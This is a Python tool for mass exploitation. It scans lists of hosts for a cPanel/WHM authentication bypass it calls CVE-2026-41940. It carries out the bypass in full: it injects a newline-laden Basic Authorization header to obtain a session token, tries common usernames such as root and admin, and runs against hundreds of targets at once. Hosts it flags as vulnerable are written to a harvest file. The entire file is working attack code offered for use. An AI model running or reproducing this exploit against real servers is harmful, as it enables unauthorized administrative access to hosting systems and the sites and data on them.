import argparse
import base64
import json
import os
import re
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, unquote

import requests
import urllib3
from tqdm import tqdm

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_USERS = [
    "root", "admin", "cpanel", "webmaster", "test",
    "guest", "info", "user", "example",
]
MARKER = b"msg_code:[expired_session]"
DEFAULT_TIMEOUT = 15
DEFAULT_PORTS = [2087, 2083, 443]

NET_ERRORS = (
    requests.exceptions.ConnectionError,
    requests.exceptions.Timeout,
    requests.exceptions.SSLError,
)

STATUS_VULNERABLE = "VULNERABLE"
STATUS_NOT_VULNERABLE = "NOT_VULNERABLE"
STATUS_CONNECTION_FAILED = "CONNECTION_FAILED"

# ANSI colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"


def attempt(host, port, prefix, cookie_name, user, timeout, protocol):
    base = f"{protocol}://{host}:{port}{prefix}"
    r = requests.get(
        f"{base}/login",
        verify=False, timeout=timeout, allow_redirects=False,
    )
    m = re.search(rf"{cookie_name}=([^;]+)", r.headers.get("Set-Cookie", ""))
    if not m:
        return False
    cookie = m.group(1)
    if "," not in unquote(cookie):
        return False
    sn = unquote(cookie).split(",")[0]

    auth = base64.b64encode(user.encode() + b":\xff\nexpired=1").decode()
    r = requests.get(
        f"{base}/",
        verify=False, timeout=timeout, allow_redirects=False,
        headers={
            "Authorization": f"Basic {auth}",
            "Cookie": f"{cookie_name}={quote(sn, safe='')}",
        },
    )
    m = re.search(r"/(cpsess\d+)", r.headers.get("Location", ""))
    if not m:
        return False
    token = "/" + m.group(1)

    r = requests.get(
        f"{base}{token}/",
        verify=False, timeout=timeout, allow_redirects=False,
        headers={"Cookie": f"{cookie_name}={cookie}"},
    )
    return MARKER in r.content


def scan(host, port, prefix, cookie_name, users, threads, timeout, protocol):
    connected = False
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futs = [
            pool.submit(attempt, host, port, prefix, cookie_name, u, timeout, protocol)
            for u in users
        ]
        for f in as_completed(futs):
            try:
                if f.result():
                    return True
                connected = True
            except NET_ERRORS:
                pass
    if not connected:
        raise requests.exceptions.ConnectionError()
    return False


def random_user():
    return "u" + os.urandom(5).hex()


def probe_endpoint(host, port, users, threads, timeout, protocol):
    if port == 2087:
        return scan(host, port, "", "whostmgrsession",
                    [random_user()], 1, timeout, protocol)
    if port == 2083:
        return scan(host, port, "", "cpsession",
                    users, threads, timeout, protocol)

    whm_ok = cp_ok = False
    try:
        if scan(host, port, "/___proxy_subdomain_whm", "whostmgrsession",
                [random_user()], 1, timeout, protocol):
            return True
        whm_ok = True
    except NET_ERRORS:
        pass
    try:
        if scan(host, port, "/___proxy_subdomain_cpanel", "cpsession",
                users, threads, timeout, protocol):
            return True
        cp_ok = True
    except NET_ERRORS:
        pass
    if not (whm_ok or cp_ok):
        raise requests.exceptions.ConnectionError()
    return False


def scan_target(target, ports, users, threads, timeout, protocol):
    # Clean target from possible protocol or malformed entries
    target_clean = target
    if '://' in target_clean:
        target_clean = target_clean.split('://', 1)[1]
    target_clean = target_clean.rstrip('/')
    if target_clean.startswith('//'):
        target_clean = target_clean[2:]

    host, _, port_str = target_clean.partition(":")
    host = host.strip()
    if not host:
        return target, STATUS_CONNECTION_FAILED, None

    if port_str:
        try:
            target_ports = [int(port_str)]
        except ValueError:
            # port_str is not a number, treat whole as host
            host = target_clean
            target_ports = ports
    else:
        target_ports = ports

    any_connected = False
    for port in target_ports:
        try:
            if probe_endpoint(host, port, users, threads, timeout, protocol):
                return target_clean, STATUS_VULNERABLE, port
            any_connected = True
        except NET_ERRORS:
            continue
        except Exception:
            any_connected = True
            continue
    if not any_connected:
        return target_clean, STATUS_CONNECTION_FAILED, None
    return target_clean, STATUS_NOT_VULNERABLE, None


def load_targets(args):
    targets = []
    if args.target:
        targets.extend(args.target)
    if args.targets_file:
        with open(args.targets_file) as f:
            targets.extend(line.strip() for line in f if line.strip()
                           and not line.startswith("#"))
    if not sys.stdin.isatty() and not args.target and not args.targets_file:
        targets.extend(line.strip() for line in sys.stdin if line.strip())
    cleaned = []
    for t in targets:
        t = t.strip()
        if '://' in t:
            t = t.split('://', 1)[1]
        t = t.rstrip('/')
        if t.startswith('//'):
            t = t[2:]
        cleaned.append(t)
    seen = set()
    deduped = []
    for t in cleaned:
        if t not in seen:
            seen.add(t)
            deduped.append(t)
    return deduped


def interactive_mode():
    """Run scanner in interactive mode with banner and file input."""
    banner = f"""
{GREEN}
    ╔══════════════════════════════════════════════════╗
    ║     cve-2026-41940 - cPanel/WHM Auth Bypass      ║
    ║                by ElKayeee1337                   ║
    ╚══════════════════════════════════════════════════╝
{RESET}
"""
    print(banner)
    list_path = input(f"{YELLOW}[*] input list: {RESET}").strip()
    if not list_path or not os.path.isfile(list_path):
        print(f"{RED}[!] File not found. Exiting.{RESET}")
        sys.exit(1)

    with open(list_path) as f:
        targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    if not targets:
        print(f"{RED}[!] No targets in list. Exiting.{RESET}")
        sys.exit(1)

    # Clean targets immediately
    cleaned_targets = []
    for t in targets:
        t = t.strip()
        if '://' in t:
            t = t.split('://', 1)[1]
        t = t.rstrip('/')
        if t.startswith('//'):
            t = t[2:]
        cleaned_targets.append(t)

    # Set default arguments for interactive mode
    args = argparse.Namespace()
    args.target = []
    args.targets_file = None
    args.users = ",".join(DEFAULT_USERS)
    args.users_file = None
    args.threads = 10          # per-target username threads
    args.concurrency = 100     # target concurrency = 100 as requested
    args.timeout = DEFAULT_TIMEOUT
    args.ports = None          # use DEFAULT_PORTS
    args.output = "kentod-good.txt"   # default output file for vulnerable targets
    args.json = None
    args.quiet = False
    args.no_progress = False
    args.protocol = "https"    # default in interactive mode

    return cleaned_targets, args


def main():
    # Interactive mode if no arguments
    if len(sys.argv) == 1:
        targets, args = interactive_mode()
        ports = DEFAULT_PORTS
        users = DEFAULT_USERS[:]
        protocol = args.protocol
        out_fh = open(args.output, "w") if args.output else None
        json_fh = None
        show_progress = not args.no_progress and sys.stderr.isatty()
    else:
        p = argparse.ArgumentParser(
            description="Scanner for cPanel/WHM authentication bypass "
                        "(CVE-2026-41940).",
        )
        p.add_argument("target", nargs="*",
                       help="One or more targets (host or host:port). "
                            "Can also be supplied via -f or stdin.")
        p.add_argument("-f", "--targets-file",
                       help="File containing one target per line.")
        p.add_argument("-u", "--users", default=",".join(DEFAULT_USERS),
                       help="Comma-separated cPanel usernames to try on port 2083 "
                            "and via the cpanel proxy path.")
        p.add_argument("-U", "--users-file",
                       help="File containing one cPanel username per line.")
        p.add_argument("-t", "--threads", type=int, default=10,
                       help="Per-target thread count for username scanning.")
        p.add_argument("-c", "--concurrency", type=int, default=100,
                       help="Number of targets to scan in parallel.")
        p.add_argument("-T", "--timeout", type=int, default=DEFAULT_TIMEOUT,
                       help="Per-request timeout in seconds.")
        p.add_argument("-p", "--ports",
                       help="Comma-separated ports to probe when none is "
                            "specified on the target. Defaults to "
                            f"{','.join(str(x) for x in DEFAULT_PORTS)}.")
        p.add_argument("--protocol", choices=["http", "https", "both"], default="https",
                       help="Protocol to use: http, https, or both (try https first, then http).")
        p.add_argument("-o", "--output", default="kentod-good.txt",
                       help="Write VULNERABLE targets (one per line) to this file. "
                            "Default: kentod-good.txt")
        p.add_argument("--json",
                       help="Write all results in JSON Lines format to this file.")
        p.add_argument("-q", "--quiet", action="store_true",
                       help="Only print VULNERABLE results to stdout.")
        p.add_argument("--no-progress", action="store_true",
                       help="Disable the progress bar.")
        args = p.parse_args()

        targets = load_targets(args)
        if not targets:
            p.error("no targets provided (use positional args, -f, or stdin)")

        if args.users_file:
            with open(args.users_file) as f:
                users = [line.strip() for line in f
                         if line.strip() and not line.startswith("#")]
        else:
            users = [u.strip() for u in args.users.split(",") if u.strip()]
        if not users:
            p.error("user list is empty")

        if args.ports:
            ports = [int(x) for x in args.ports.split(",") if x.strip()]
        else:
            ports = DEFAULT_PORTS

        protocol = args.protocol
        out_fh = open(args.output, "w") if args.output else None
        json_fh = open(args.json, "w") if args.json else None
        show_progress = not args.no_progress and sys.stderr.isatty()

    counts = {STATUS_VULNERABLE: 0,
              STATUS_NOT_VULNERABLE: 0,
              STATUS_CONNECTION_FAILED: 0}

    # Helper to scan with a specific protocol, or both if needed
    def scan_with_protocol(target, protocol_used):
        if protocol_used == "both":
            try:
                return scan_target(target, ports, users, args.threads, args.timeout, "https")
            except Exception:
                return scan_target(target, ports, users, args.threads, args.timeout, "http")
        else:
            return scan_target(target, ports, users, args.threads, args.timeout, protocol_used)

    try:
        with ThreadPoolExecutor(max_workers=args.concurrency) as pool:
            futs = {
                pool.submit(scan_with_protocol, t, protocol): t
                for t in targets
            }
            it = as_completed(futs)
            if show_progress:
                it = tqdm(it, total=len(futs), unit="target",
                          desc="scanning", file=sys.stderr,
                          dynamic_ncols=True, leave=False)

            for f in it:
                target, status, port = f.result()
                counts[status] += 1

                if status == STATUS_VULNERABLE:
                    line = f"{GREEN}[!] {target} VULNERABLE{RESET}" + (f" (port {port})" if port else "")
                    if show_progress:
                        it.write(line)
                    else:
                        print(line, flush=True)
                    if out_fh:
                        out_fh.write(f"{target}\n")
                        out_fh.flush()
                elif not args.quiet:
                    if status == STATUS_NOT_VULNERABLE:
                        line = f"{RED}[+] {target} NOT VULNERABLE{RESET}"
                    else:
                        line = f"{YELLOW}[?] {target} CONNECTION FAILED{RESET}"
                    if show_progress:
                        it.write(line)
                    else:
                        print(line, flush=True)

                if json_fh:
                    rec = {"target": target, "status": status, "port": port}
                    json_fh.write(json.dumps(rec) + "\n")
                    json_fh.flush()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] interrupted{RESET}", file=sys.stderr)
        sys.exit(130)
    finally:
        if out_fh:
            out_fh.close()
        if json_fh:
            json_fh.close()

    summary = (f"scanned={len(targets)} "
               f"vulnerable={counts[STATUS_VULNERABLE]} "
               f"not_vulnerable={counts[STATUS_NOT_VULNERABLE]} "
               f"connection_failed={counts[STATUS_CONNECTION_FAILED]}")
    print(summary, file=sys.stderr)

    if counts[STATUS_VULNERABLE] > 0:
        sys.exit(0)
    if counts[STATUS_NOT_VULNERABLE] > 0:
        sys.exit(1)
    sys.exit(2)


if __name__ == "__main__":
    main()